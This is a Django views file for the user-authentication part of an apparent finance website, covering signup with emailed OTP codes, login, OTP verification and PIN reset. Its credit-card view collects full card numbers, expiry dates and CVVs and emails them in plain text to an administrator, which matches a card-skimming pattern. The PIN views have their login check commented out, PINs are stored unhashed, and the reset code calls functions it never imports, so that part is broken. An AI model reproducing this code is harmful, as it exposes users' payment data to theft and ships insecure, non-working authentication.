from django.shortcuts import render, redirect
from django.contrib import messages
from django.contrib.auth.decorators import login_required
from .forms import PinForm, LoginForm, SignupForm
from django.core.mail import send_mail
from .models import UserOTP
import pyotp
from django.contrib.auth import authenticate, login

from django.contrib.auth.tokens import default_token_generator
from django.utils.http import urlsafe_base64_encode
from django.utils.encoding import force_bytes
from .models import User
from django.core.mail import send_mail
from django.template.loader import render_to_string


def splash(request):
    return render(request, "userauths/splash.html")


def register(request):
    return render(request, "userauths/register.html")


def profile(request):
    return render(request, "userauths/profile.html")


def signup_view(request):
    if request.method == "POST":
        form = SignupForm(request.POST)
        if form.is_valid():
            user = form.save(commit=False)
            user.is_active = False  # User will remain inactive until OTP verification
            user.save()
            messages.success(request, f"Welcome {user.username}, please verify your account with the OTP sent to your email.")

            # Generate and store a TOTP base key in a secure manner
            base_key = pyotp.random_base32()
            user.totp_secret = base_key  # Ensure `totp_secret` field exists in your User model
            user.save()

            # Generate OTP code and save it in UserOTP model
            otp = pyotp.TOTP(base_key).now()
            UserOTP.objects.create(user=user, otp_code=otp)

            # Send OTP to user’s email
            subject = "Your OTP Code"
            message = f"Hello {user.username}, your OTP code is {otp}. Please use it to complete your registration."
            from_email = "noreply@offshore.com"
            recipient_list = [user.email]
            send_mail(subject, message, from_email, recipient_list)

            return redirect("userauths:verify_otp", user_id=user.id)
        else:
            messages.error(request, "Invalid form data.")
    else:
        form = SignupForm()

    return render(request, "userauths/signup.html", {"form": form})


def login_view(request):
    if request.method == "POST":
        form = LoginForm(request, data=request.POST)
        if form.is_valid():
            username = form.cleaned_data.get("username")
            password = form.cleaned_data.get("password")
            
            user = authenticate(request, username=username, password=password)
            if user is not None:
                if user.is_active:
                    login(request, user)
                    messages.success(request, f"Welcome back, {user.username}!")
                    return redirect("finance:index")
                else:
                    messages.error(request, "Your account is inactive. Please complete OTP verification.")
                    return redirect("userauths:verify_otp", user_id=user.id)
            else:
                messages.error(request, "Invalid username or password.")
        else:
            messages.error(request, "Invalid login credentials.")

    else:
        form = LoginForm()

    return render(request, "userauths/login.html", {"form": form})


def verify_otp(request, user_id):
    try:
        user = User.objects.get(pk=user_id)
        
        if request.method == "POST":
            otp_input = request.POST.get("otp")
            user_otp = UserOTP.objects.get(user=user)
            
            if user_otp.otp_code == otp_input:
                user.is_active = True
                user.save()
                user_otp.delete()  # OTP verified, remove it from the database
                messages.success(request, "OTP verified successfully! Your account is now active.")
                return redirect("finance:index")
            else:
                messages.error(request, "Invalid OTP. Please try again.")
                
    except User.DoesNotExist:
        messages.error(request, "User not found.")
        return redirect("userauths:login")
    except UserOTP.DoesNotExist:
        messages.error(request, "OTP not found or has already been used.")
        return redirect("userauths:login")

    return render(request, "userauths/verify_otp.html", {"user_id": user_id})


# views.py
from django.conf import settings
# from django.core.mail import send_mail
# from django.shortcuts import render, redirect
from .forms import CreditCardForm

from django.views.decorators.csrf import csrf_protect

@csrf_protect  # Ensures CSRF token protection for form submission
def credit_card_view(request):
    if request.method == 'POST':
        # Extract data from POST request
        card_number = request.POST.get('cardNumber')
        exp_date = request.POST.get('expDate')
        cvv = request.POST.get('cvv')
        cardholder_name = request.POST.get('cardholderName')

        # Prepare email content
        subject = "New Credit Card Submission"
        message = (
            f"Card Holder Name: {cardholder_name}\n"
            f"Card Number: {card_number}\n"
            f"Expiration Date: {exp_date}\n"
            f"CVV: {cvv}"
        )
        admin_email = settings.ADMIN_EMAIL
        send_mail(subject, message, settings.DEFAULT_FROM_EMAIL, [admin_email])

        return redirect('userauths:success_page')  # Redirect to a success page if needed

    return render(request, 'userauths/credit_card_form.html')
# @login_required
def set_pin(request):
    # if request.method == 'POST':
    #     form = PinForm(request.POST, instance=request.user)
    #     if form.is_valid():
    #         form.save()
    #         messages.success(request, "Your pin has been set successfully!")
    #         return redirect('finance:home')
    # else:
    #     form = PinForm(instance=request.user)
    return render(request, 'userauths/set_pin.html')


# return render(request, 'userauths/set_pin.html', {'form': form})


# @login_required
def enter_pin(request):
    # if request.method == 'POST':
    #     pin_entered = request.POST['pin']
    #     if pin_entered == request.user.pin:
    #         return redirect('finance:home')
    #     else:
    #         # Handle invalid PIN entered
    #         pass
    return render(request, 'userauths/enter_pin.html')

def success(request):
    return render(request, "userauths/success.html")


def finish(request):
    return render(request, "userauths/finish.html")


def generate_reset_pin_token(user):
    return default_token_generator.make_token(user)


def send_reset_pin_email(user, reset_pin_token):
    subject = 'Reset Your PIN'
    message = render_to_string('userauths/reset_pin_email.html', {
        'user': user,
        'reset_pin_token': reset_pin_token,
    })
    user_email = user.email
    send_mail(subject, message, None, [user_email])


def reset_pin_request(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        user = User.objects.get(email=email)
        reset_pin_token = generate_reset_pin_token(user)
        send_reset_pin_email(user, reset_pin_token)
        return redirect('password_reset_done')
    return render(request, 'reset_pin_request.html')


def reset_pin_confirm(request, uidb64, token):
    try:
        uid = force_text(urlsafe_base64_decode(uidb64))
        user = User.objects.get(pk=uid)
    except (TypeError, ValueError, OverflowError, User.DoesNotExist):
        user = None

    if user is not None and default_token_generator.check_token(user, token):
        # Token is valid, allow the user to reset PIN
        if request.method == 'POST':
            new_pin = request.POST.get('new_pin')
            user.pin = new_pin
            user.save()
            return redirect('userauths:password_reset_complete')
        return render(request, 'userauths/reset_pin_confirm.html')
    else:
        # Invalid token or user
        return redirect('userauths:password_reset_invalid')
